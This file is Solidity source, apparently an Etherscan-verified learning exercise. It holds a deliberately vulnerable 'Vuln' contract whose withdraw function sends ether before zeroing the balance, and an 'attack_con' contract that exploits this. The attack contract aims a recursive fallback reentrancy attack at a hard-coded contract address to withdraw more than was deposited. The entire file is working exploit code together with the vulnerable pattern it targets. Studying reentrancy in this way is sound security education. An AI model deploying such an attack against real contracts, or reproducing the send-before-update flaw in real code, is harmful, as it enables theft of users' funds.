/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;

//vuln contract from given github, vuln.sol
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

//my attack contract to exploit vuln
contract attack_con {

    //instantiate a vuln to hold the contract,
    // and an int to hold the number of times withdraw has called in the fallback function
    Vuln target_vuln = Vuln(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d);
    uint withdraw_iter = 0;


    //deposit function for sending in eth, uses the vuln contract deposit - then calls withdraw, moving to fallback function
    function deposit() public payable{
        target_vuln.deposit.value(msg.value)();
        target_vuln.withdraw();
    }

    //withdraw function for taking eth, uses the vuln contract withdraw
    function withdraw() public payable{
        target_vuln.withdraw();
        //troublshooting stuff, transfers balance on atk withdraw
        msg.sender.transfer(address(this).balance);
    }

    //the fallback function doing the exploiting, a fallback function that gets called when the vuln contract sends back same eth from deposit as a withdraw
    //the fallback calls the withdraw function again - before the other function has finished, resulting in more money than intended being withdrawn
    //because balance is not yet 0
    //(repeated withdraw_iter times)
    fallback() external payable{
        //check iterations
        if(withdraw_iter < 3){
            //increment iteration counter
            withdraw_iter++;
            //call withdraw from vuln
            target_vuln.withdraw();
        }

        //reset counter
        withdraw_iter = 0;
    }

}